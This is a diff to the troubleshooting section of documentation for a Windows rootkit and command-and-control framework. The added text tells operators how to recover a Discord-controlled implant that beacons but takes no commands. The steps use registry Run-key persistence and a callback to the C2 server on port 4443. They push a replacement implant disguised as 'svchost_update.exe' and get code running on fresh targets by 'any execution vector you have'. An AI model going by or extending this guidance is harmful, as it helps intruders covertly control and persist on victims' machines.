@@ -1162,11 +1162,44 @@ Reassemble:
 2. Try different port: `python vader_ui.py 9000`
 3. Check Python version: must be 3.10+ for some stdlib features
 
+### Discord deploy doesn't work — "No response within 30s"
+
+**This is the bootstrap problem.** The Discord implant on the target is an old build that beacons (heartbeats appear) but doesn't poll for commands. It's deaf — sends but never listens.
+
+**Why it happens:** The first time you deploy to a target, the implant doesn't have the bidirectional command-polling loop. You can only fix this via TCP.
+
+**Recovery procedure:**
+1. **Reboot the target** — if `persist` was run previously, the registry Run keys auto-start `vader_shell.exe` on boot. It has C2 IP baked in and will call back to :4443 automatically.
+2. Wait for TCP session to appear: `[+] SHELL: <id> connected from <ip>`
+3. Once TCP is up: `deploy` — this pushes the NEW `svchost_update.exe` (with command polling) to the target, replacing the deaf one.
+4. After deploy: `persist` — updates registry to point to the new binaries.
+5. From now on, Discord is bidirectional. You can deploy via Discord in the future.
+
+**If no persist was set (fresh target):** You need physical or remote access to run the binary manually:
+```
+:: On target machine:
+C:\Users\Public\vader_shell.exe
+```
+Or trigger via network share / RDP / any execution vector you have.
+
+**Rule:** First deploy to any new target MUST be via TCP or physical access. Discord bidirectional only works after the new implant is deployed at least once.
+
+### Interactive shell returns echo only (no output)
+
+After running `watch`, the PowerShell loop on the target keeps running even after Ctrl+C. It consumes cmd.exe's stdin — all commands echo but don't execute.
+
+**Fix:** The latest C2 code auto-kills PowerShell on watch exit. If you hit this on an older version:
+```
+:: At the interact prompt:
+taskkill /F /IM powershell.exe
+```
+Then commands work again. Or: `back` → `deploy` → interact the new session.
+
 ---
 
 ```
 22DIV / george wu
-VADER ROOTKIT — Build from Ashes
+CHEYANNE — Build from Ashes
 "The hunt never ends."
 ```
 
